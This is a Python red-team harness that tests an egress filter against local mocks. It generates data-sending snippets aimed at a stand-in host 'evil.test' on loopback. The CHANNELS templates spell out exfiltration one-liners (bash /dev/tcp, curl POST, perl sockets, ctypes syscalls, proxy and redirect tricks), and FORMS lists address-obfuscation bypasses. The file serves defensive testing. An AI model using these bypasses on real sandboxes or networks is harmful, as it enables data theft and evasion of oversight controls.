"""L4 adaptive red-team harness (P29-06), restricted to the local mocks. A seeded generator proposes channel x destination-form attacks toward the UNAUTHORIZED sink; after each failure it re-plans by
varying the destination form on the same channel and the channel on the same form. A bypass = oracle bytes at the unauthorized sink. Every success keeps a minimal reproducer."""
from __future__ import annotations
import random
CHANNELS = {
 "py_socket": "raw({ip!r}, @BAD@)",
 "urllib": "res=send('POST','http://{host}:@BAD@/x','@CAN@')",
 "http_client": "import http.client\nc=http.client.HTTPConnection({ip!r},@BAD@,timeout=2);c.request('POST','/x','@CAN@');c.getresponse()",
 "asyncio": "import asyncio\nasync def f():\n  r,w=await asyncio.open_connection({ip!r},@BAD@);w.write(b'POST /x HTTP/1.0\\r\\n\\r\\n@CAN@');await w.drain();w.close()\nasyncio.run(f())",
 "curl": "import subprocess\nsubprocess.run(['curl','-s','-m','2','-d','@CAN@','http://{host}:@BAD@/x'],capture_output=True)",
 "bash_devtcp": "import subprocess\nsubprocess.run(['bash','-c','echo @CAN@ > /dev/tcp/{ip}/@BAD@'],capture_output=True)",
 "perl": "import subprocess\nsubprocess.run(['perl','-MIO::Socket::INET','-e','$s=IO::Socket::INET->new(PeerAddr=>\"{ip}:@BAD@\");print $s \"@CAN@\";sleep 1'],capture_output=True)",
 "python_child": "import subprocess\nsubprocess.run(['python3','-c','import socket;s=socket.create_connection((\"{ip}\",@BAD@));s.sendall(b\"@CAN@\")'],capture_output=True)",
 "ctypes_syscall": "import ctypes,struct\nlibc=ctypes.CDLL(None,use_errno=True);fd=libc.socket(2,1,0)\nif fd>=0:\n  a=struct.pack('<HH4s8s',2,__import__('socket').htons(@BAD@),__import__('socket').inet_aton({ip!r}),b'');libc.connect(fd,a,16);libc.write(fd,b'@CAN@',22)",
 "udp": "import socket\ns=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.sendto(b'@CAN@',({ip!r},@BAD@))",
 "proxy_env": "os.environ['http_proxy']='http://127.0.0.1:@BAD@'\nsend('GET','http://anything.invalid/x')",
 "unix_abstract": "import socket\ns=socket.socket(socket.AF_UNIX);s.connect('\\0hz-bad')",
 "redirect_chain": "send('GET','http://approved.test:@OK@/redir?to=http://{host}:@BAD@/x')",
}
FORMS = {"name": ("evil.test", "127.0.0.1"), "ip": ("127.0.0.1", "127.0.0.1"), "decimal": ("2130706433", "2130706433"), "hex": ("0x7f000001", "0x7f000001"), "octal": ("0177.0.0.1", "0177.0.0.1"), "short": ("127.1", "127.1"),
         "mapped6": ("[::ffff:127.0.0.1]", "::ffff:127.0.0.1"), "userinfo": ("approved.test@127.0.0.1", "127.0.0.1"), "trailing_dot": ("evil.test.", "127.0.0.1"), "upper": ("EVIL.TEST", "127.0.0.1")}


def program(channel, form):
    host, ip = FORMS[form]; return CHANNELS[channel].replace("{host}", host).replace("{ip!r}", repr(ip)).replace("{ip}", ip)


def campaign(seed: int, budget: int, run_attempt):
    """run_attempt(code)->bool bypass. Returns attempts list. Deterministic given seed + budget + target behavior."""
    rnd = random.Random(seed); pairs = [(c, f) for c in CHANNELS for f in FORMS]; rnd.shuffle(pairs); queue, tried, log = list(pairs), set(), []
    while queue and len(log) < budget:
        ch, fm = queue.pop(0)
        if (ch, fm) in tried: continue
        tried.add((ch, fm)); code = program(ch, fm); hit = run_attempt(code); log.append({"channel": ch, "form": fm, "bypass": bool(hit), "code": code if hit else None})
        if not hit:                                                           # re-plan: neighbours of a failed attempt go to the front of the queue
            nb = [(ch, f) for f in FORMS if (ch, f) not in tried][:2] + [(c, fm) for c in CHANNELS if (c, fm) not in tried][:2]
            queue = nb + [q for q in queue if q not in nb]
    return log
